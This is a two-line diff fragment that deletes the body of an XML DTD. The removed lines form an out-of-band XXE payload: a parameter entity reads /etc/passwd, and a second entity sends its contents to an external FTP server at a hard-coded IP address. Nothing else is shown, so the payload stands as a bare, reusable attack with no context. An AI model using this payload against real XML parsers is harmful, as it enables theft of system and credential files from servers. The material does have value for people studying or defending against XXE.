@@ -1,2 +1,0 @@
-<!ENTITY % d SYSTEM "file:///etc/passwd">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://159.65.28.225:21/%d;'>"> 
